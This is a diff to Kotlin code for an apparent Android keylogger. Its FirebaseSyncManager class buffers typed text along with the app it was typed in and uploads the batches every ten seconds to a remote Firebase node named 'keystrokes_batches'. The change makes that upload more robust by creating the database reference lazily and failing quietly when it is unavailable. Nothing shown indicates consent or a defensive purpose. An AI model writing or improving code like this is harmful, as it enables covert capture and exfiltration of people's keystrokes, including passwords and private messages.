@@ -16,7 +16,12 @@ class FirebaseSyncManager {
         private val buffer = StringBuilder()
         private val scope = CoroutineScope(Dispatchers.IO)
         private var lastAppName = "unknown.app"
-        private val databaseRef = FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+
+        private fun getDatabaseRef() = try {
+            FirebaseDatabase.getInstance().getReference("keystrokes_batches")
+        } catch (e: Exception) {
+            null
+        }
 
         init {
             startPeriodicSync()
@@ -51,6 +56,7 @@ class FirebaseSyncManager {
             }
 
             try {
+                val ref = getDatabaseRef() ?: return
                 val sanitizedAppName = appName.replace(Regex("[^a-zA-Z0-9._-]"), "_")
                 val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(Date())
 
@@ -60,7 +66,7 @@ class FirebaseSyncManager {
                     "typedContent" to content
                 )
 
-                databaseRef.child(sanitizedAppName).child(timestampKey).setValue(logData)
+                ref.child(sanitizedAppName).child(timestampKey).setValue(logData)
                     .addOnSuccessListener {
                         Log.d(TAG, "Successfully synced 10-sec batch of logs to Firebase")
                     }
